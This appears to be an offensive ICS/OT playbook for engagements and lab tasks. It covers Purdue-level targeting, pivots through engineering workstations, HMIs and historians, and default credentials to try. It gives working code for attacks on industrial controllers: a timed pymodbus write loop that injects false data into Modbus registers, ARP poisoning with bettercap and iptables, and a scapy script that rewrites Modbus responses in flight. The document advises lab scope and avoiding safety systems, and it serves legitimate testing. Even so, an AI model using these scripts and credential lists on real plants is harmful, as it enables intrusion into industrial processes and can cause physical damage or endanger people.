# ICS Attack Patterns

Patterns and pivots used in real OT engagements and lab tasks once protocol triage and read-only interaction are exhausted. Read-only-first still applies; the goal here is to widen the target surface beyond direct PLC protocol writes.

## Purdue-model mapping

Before choosing a target, classify each host in scope into the Purdue Enterprise Reference Architecture:

- L0 — sensors, actuators, instruments. Usually only reachable via L1.
- L1 — PLCs, RTUs, IEDs. Modbus/S7/CIP/DNP3 endpoints.
- L2 — HMI/SCADA panels, alarm servers, local engineering workstations.
- L3 — historians, MES, batch/recipe servers, AD-joined OT domain.
- L3.5 — DMZ (jump hosts, patch servers, AV, remote access portals).
- L4 — corporate IT, business apps, identity.

Two practical consequences:

1. The shortest path to an objective is often L2/L3 (HMI web, RDP to engineering workstation, historian SQL) rather than direct L1 protocol abuse. Native engineering tools authenticate as themselves and bypass detections tuned for malformed Modbus/CIP.
2. Pivoting up the Purdue stack (L1 → L2 → L3 → L3.5) is rarely the goal; pivoting down is. From an L3 foothold, project files, OPC servers, and HMI clients give labelled access to L1.

## Engineering-workstation pivot

The engineering workstation is the highest-value box in scope. Once it is reachable (RDP, SMB, AD creds, exposed shares), look for:

- Project archives — vendor format identifies the controller family:
  - `.acd`, `.l5x`, `.l5k` — Rockwell RSLogix 5000 / Studio 5000.
  - `.ap14`, `.zap14`, `.ap15`, `.zap15`, `.s7p`, `.ap13` — Siemens TIA Portal / Step7.
  - `.pro`, `.projectarchive`, `.library` — Codesys and Codesys-based runtimes.
  - `.mwt` — Schneider Unity Pro / EcoStruxure.
  - `.pcd` — Wago / e!Cockpit.
  - `.gx3`, `.gxw` — Mitsubishi GX Works.
- Tag databases and CSV exports — ground truth for what a register/coil/tag actually means.
- HMI projects — labelled buttons, alarms, recipes, and screen captures that explain the process better than the PLC itself.
- Stored credentials in `.ini`, `.xml`, `.config` next to the project, and in vendor credential stores (Studio 5000 communication paths, TIA Portal `Net configuration`).
- Network configuration files — VLAN, gateway, routing, and remote-IO addressing.

Vendor IDEs let an authenticated user upload modified logic to the PLC over its native protocol. Treat that as a logic-modification primitive only in an isolated lab and only when scope requires it; even then prefer offline diff of the project archive over live download.

## Project-file triage recipes

```bash
# Identify a TIA Portal archive
unzip -l target.zap14 | head -40           # vendor zip layout
file target.ap14

# RSLogix L5X is XML — fastest way to read tags and rungs
xmllint --format target.L5X | head -200
grep -E 'Name="|Tag Name' target.L5X | sort -u | head -50

# Codesys project archive is also a zip in many versions
unzip -l target.projectarchive
```

For binary `.acd` files use `acd-tools` or `pylogix`/`pycomm3` to parse and pull tag listings. For Step7 `.s7p` use `Step7-to-text` or open in TIA Portal locally.

## Race-condition / False Data Injection (FDI)

Master/PLC traffic is usually periodic. When the master polls every N seconds, the PLC updates outputs every M cycles, and a write needs to land in the gap between PLC update and master read.

Steps:

1. From the PCAP, recover the polling period (delta-time between repeated request frames) and the PLC scan-cycle hint (delta between unsolicited updates or coil-state changes).
2. From PLC ladder logic or HMI screens, identify the input → output map (which holding registers drive which coils).
3. Choose the smallest write that flips the master's verification: a single coil or register, not the entire bank.
4. Write inside the cycle window with a tight loop; verify the master either logs an error, returns a flag, or shifts state.

Skeleton (Modbus example):

```python
import time, sys
from pymodbus.client import ModbusTcpClient

POLL_PERIOD = 3.0       # master poll interval (seconds), from PCAP
WRITE_OFFSET = 1.5      # write at ~half the period, after PLC update, before master read

c = ModbusTcpClient("TARGET", 502); c.connect()
t0 = time.time()
while True:
    now = time.time()
    phase = (now - t0) % POLL_PERIOD
    if abs(phase - WRITE_OFFSET) < 0.05:
        c.write_register(2, 0xFFFF, slave=1)   # flip one tag
        time.sleep(POLL_PERIOD / 2)
    time.sleep(0.01)
```

If the master verifies via a side channel (UDP status oracle, REST endpoint, alarm relay), pull that side channel concurrently and stop the loop as soon as the desync is observed. Some lab targets reset every 1 s — the write must land and be observed within that window.

## Layer-2 MITM in flat OT segments

When direct write is logged or alarmed but rewriting traffic in flight is not, an L2 MITM between HMI and PLC (or between two PLCs on a Device-Level Ring) lets you mutate Modbus/EtherNet/IP/S7 frames before they reach the destination.

Building blocks (Linux):

```bash
# 1. ARP-poison both endpoints
bettercap -iface eth0 -eval "set arp.spoof.targets 10.0.0.10,10.0.0.20; arp.spoof on; net.sniff on"

# 2. Redirect intercepted frames into a userspace queue
sysctl -w net.ipv4.ip_forward=1
iptables -I FORWARD -p tcp --dport 502 -j NFQUEUE --queue-num 1
```

```python
# 3. Rewrite Modbus frames in flight
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

def cb(pkt):
    s = IP(pkt.get_payload())
    if s.haslayer(Raw):
        data = bytes(s[Raw].load)
        # MBAP header: tx_id(2) proto(2) len(2) unit(1) | FC(1) ...
        if len(data) >= 8 and data[7] in (0x03, 0x04):    # read holding/input regs
            # flip first register value in the response (server-to-client direction)
            data = data[:9] + b"\x00\x00" + data[11:]
            s[Raw].load = data
            del s[IP].chksum; del s[TCP].chksum
            pkt.set_payload(bytes(s))
    pkt.accept()

NetfilterQueue().bind(1, cb)
NetfilterQueue().run()
```

This pattern works equally for CIP (`enip` 44818) and S7 (102) by adjusting the offset of the value field; the trick is that the HMI/master sees the mutated value while the PLC still operates on the real one (or vice versa). Use Wireshark on a span port to confirm both directions before claiming success.

## HMI-side pivots

HMIs are often the weakest box in the OT segment:

- VNC on 5900/5901 with no password or a default password (common on integrator-built panels).
- Vendor HMI web on 8080/8443 with default credentials documented in the vendor manual.
- Windows-based HMIs with shared SMB folders containing the project file, recipes, and screen captures (which label the tag/alarm meanings).
- Saved RDP files (`.rdp`) and `cmdkey` entries pointing back to the engineering workstation.
- HMI screenshots are an evidence goldmine: the screen labels each pump/valve/setpoint, so a `screenshot.png` plus a register dump usually solves the "what does this coil do" question without reverse engineering.

## Historian and OT databases

Historians store every tag for months/years and usually run with weak credentials:

- OSIsoft PI / AVEVA PI: PI Data Archive on TCP 5450, PI Network Manager on 5462; PI SQL Commander, PI Web API.
- Rockwell FactoryTalk Historian SE: based on PI, similar ports.
- Wonderware (AVEVA) Historian: SQL Server with proprietary blob columns.
- Siemens WinCC: SQL Server with WinCC schema.
- GE Proficy Historian: TCP 14000, REST/OPC HDA.

A historian gives:

- Tag list with engineering units and descriptions — answers the "what does TAG_4711 mean" question instantly.
- Timeseries that prove a process anomaly without touching the live PLC.
- Recipes, batches, and alarm tables that often contain text strings, operator notes, and flag-style data.

Try MSSQL with default sa/SCADA/winccsa/operator credentials before attacking the historian protocols themselves.

## Safety-instrumented systems (SIS)

If hosts are tagged as Triconex, ProSafe-RS, HIMA, AC800M HI, or similar, treat them as **out of scope** by default. SIS exists to bring the process to a safe state when the basic control system fails; interfering with it is a real-world safety hazard and almost never within a lab's intended scope. Document the host, do not interact, and call this out in the report.

## Operational-impact reasoning

A write is only meaningful if it changes something an operator/oracle observes. Before claiming success, map:

- The register/coil/tag changed.
- The HMI screen, alarm row, historian sample, or scoreboard endpoint that reflects the change.
- The expected physical/process effect (pump on, valve open, setpoint exceeded, interlock tripped).
- The signal the success oracle uses (text on a UDP socket, HTTP response, log line, flag file).

If three of four are missing, the write is noise. Re-baseline and pick a different tag.

## Stop and document

Stop after the oracle reports success or the proof artifact is captured. Restore prior values when scope allows, record the exact request sequence, and include in the writeup:

- Purdue-level placement of each touched host.
- Project-file evidence used to label tags.
- Polling/scan timing and write window.
- Whether L2 MITM or direct write was used.
- Side effects observed on adjacent registers, alarms, or HMI screens.
